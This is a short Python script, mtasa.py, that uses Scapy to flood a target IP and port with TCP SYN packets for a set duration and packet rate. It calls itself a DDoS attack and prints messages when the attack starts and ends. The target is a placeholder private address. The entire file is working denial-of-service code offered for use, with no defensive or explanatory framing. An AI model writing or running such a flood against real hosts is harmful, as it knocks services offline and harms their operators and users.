# mtasa.py

from scapy.all import *
import time

def ddos_attack(target_ip, target_port, duration, packets_per_second):
    end_time = time.time() + duration
    while time.time() < end_time:
        ip = IP(dst=target_ip)
        tcp = TCP(dport=target_port, flags='S')
        packet = ip/tcp
        send(packet, verbose=0)
        time.sleep(1 / packets_per_second)

if __name__ == "__main__":
    target_ip = "192.168.1.100"  
    target_port = 80 
    duration = 60  
    packets_per_second = 100  

    print(f"Starting DDoS attack on {target_ip}:{target_port} for {duration} seconds at {packets_per_second} pps...")
    ddos_attack(target_ip, target_port, duration, packets_per_second)
    print("Attack finished.")
